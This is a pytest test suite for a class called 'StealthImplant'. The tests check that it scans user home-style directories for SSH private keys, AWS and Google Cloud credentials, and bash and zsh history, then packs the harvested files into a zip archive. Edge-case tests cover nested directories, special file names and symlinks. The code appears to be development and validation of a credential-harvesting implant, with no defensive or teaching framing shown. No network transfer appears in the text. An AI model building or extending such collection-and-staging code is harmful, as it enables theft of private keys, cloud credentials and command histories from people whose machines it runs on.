import pytest
from pathlib import Path
import zipfile
from io import BytesIO
import os
from tmp363 import StealthImplant

@pytest.fixture
def complex_test_dir(tmp_path):
    base = tmp_path / "test_data"
    base.mkdir()

    (base / ".ssh").mkdir()
    (base / ".ssh" / "id_rsa").write_text("private_key")
    (base / ".config").mkdir()
    (base / ".config" / "settings.json").write_text("{}")
    
    (base / "user1" / ".aws").mkdir(parents=True)
    (base / "user1" / ".aws" / "credentials").write_text("AKIA...")
    (base / "user1" / ".gcloud").mkdir()
    (base / "user1" / ".gcloud" / "config").write_text("project=test")

    (base / ".bash_history").write_text("ls")
    (base / "user1" / ".zsh_history").write_text("cd")
    
    # not the one we looking for
    (base / "cache").mkdir()
    (base / "tmp").mkdir()
    (base / "readme.txt").write_text("documentation")

    return base

def test_target_directory_scaning(complex_test_dir):
    implant = StealthImplant(
        source=str(complex_test_dir),
        target_files=[".ssh", ".config", ".aws", ".gcloud"],
        test=True
    )

    collected = implant.walk_dir()
    collected_paths = {str(p.relative_to(complex_test_dir)) for p in collected}

    assert ".ssh/id_rsa" in collected_paths
    assert ".config/settings.json" in collected_paths
    assert "user1/.aws/credentials" in collected_paths
    assert "user1/.gcloud/config" in collected_paths

    assert "readme.txt" not in collected_paths

def test_history_file_matching(complex_test_dir):
    implant = StealthImplant(
        source=str(complex_test_dir),
        target_files=[],
        history_glob=".*_history",
        test=True
    )

    collected = implant.walk_dir()
    collected_names = { p.name for p in collected } 

    assert ".bash_history" in collected_names
    assert ".zsh_history" in collected_names
    assert len(collected) == 2


def test_nested_directory_handling(complex_test_dir):
    implant = StealthImplant(
        source=str(complex_test_dir / "user1"),
        target_files=[".aws", ".gcloud"],
        history_glob="[!]*",
        test=True,
    )

    collected = implant.walk_dir()
    assert len(collected) == 2
    assert "credentials" in { p.name for p in collected }
    assert "config" in { p.name for p in collected }


def test_mixed_target_types(complex_test_dir):
    implant = StealthImplant(
        source=str(complex_test_dir),
        # dirs + files
        target_files=[".ssh", "specific_file.txt"],
        test=True,
    )

    # create the file
    (complex_test_dir / "specific_file.txt").write_text("important")

    collected = implant.walk_dir()
    collected_names = { p.name for p in collected }

    assert "id_rsa" in collected_names
    assert "specific_file.txt" in collected_names

def test_zip_structure_vertification(complex_test_dir):
    implant = StealthImplant(
        source=str(complex_test_dir),
        target_files=[".ssh",".config",".aws", ".gcloud"],
        history_glob=".*_history",
        test=True
    )
    zip_data = implant.create_zip(implant.walk_dir())

    with zipfile.ZipFile(BytesIO(zip_data)) as zf:
        assert "test_data/.ssh/id_rsa" in zf.namelist()
        assert "test_data/user1/.aws/credentials" in zf.namelist()
        assert zf.read("test_data/.ssh/id_rsa") == b"private_key"
        assert zf.read("test_data/.config/settings.json") == b"{}"
        assert "test_data/.bash_history" in zf.namelist()
        assert "test_data/user1/.zsh_history" in zf.namelist()

def test_target_source_same(complex_test_dir):
    implant = StealthImplant(
        source=str(complex_test_dir),
        target_files=[str(complex_test_dir)],
        test=True
    )

    (complex_test_dir / "tmp" / "temp.log").write_text("data")
    (complex_test_dir / "cache" / "cache.log").write_text("cached")

    collected = implant.walk_dir()
    collected_paths = {str(p.relative_to(complex_test_dir)) for p in collected}

    print(collected_paths)
    assert "tmp/temp.log" in collected_paths
    assert "cache/cache.log" in collected_paths

def test_special_characters_handling(tmp_path):
    base = tmp_path / "test_data"
    base.mkdir()

    special_names = [
        "file with spaces.txt",
        "unicode_中文.txt",
        "special!@#$%^&*()_+.txt"
    ]

    for name in special_names:
        (base / name).write_text("content")

    implant = StealthImplant(
            source=str(base),
            target_files=special_names,
            test=True,
            history_glob="[!]*"
    )

    collected = implant.walk_dir()
    assert len(collected) == len(special_names)

    zip_data = implant.create_zip(collected)
    with zipfile.ZipFile(BytesIO(zip_data)) as zf:
        for name in special_names:
            assert f"test_data/{name}" in zf.namelist()

def test_symbolic_files(tmp_path):

    base = tmp_path / "test_data"
    base.mkdir()

    target_file = base / "target.txt"

    target_file.write_text("secret data")

    symlink = base / "symlink.txt"
    os.symlink(target_file, symlink)

    implant = StealthImplant(
        source=str(base),
        target_files = ["symlink.txt", "target.txt"],
        test=True
    )

    collected = implant.walk_dir()
    collected_names = {p.name for p in collected}

    assert "target.txt" in collected_names
    assert "symlink.txt" in collected_names
    assert len(collected) == 2

    zip_data = implant.create_zip(collected)
    with zipfile.ZipFile(BytesIO(zip_data)) as zf:
        assert zf.read("test_data/target.txt") == b"secret data"
        assert "symlink.txt" not in zf.namelist()

def test_symbolic_directory(tmp_path):

    base = tmp_path / "test_data"

    base.mkdir()

    target_dir = base / "real_dir"
    target_dir.mkdir()
    
    target_file = target_dir / "target.txt"
    target_file.write_text("secret data")

    symlink_dir = base / "link_to_read_dir"
    os.symlink(target_dir, symlink_dir)

    implant = StealthImplant(
        source=str(base),
        # directory we reading
        target_files = ["link_to_read_dir"],
        test=True
    )

    collected = implant.walk_dir()
    collected_names = {p.name for p in collected}

    assert "target.txt" not in collected_names
    assert len(collected) == 0

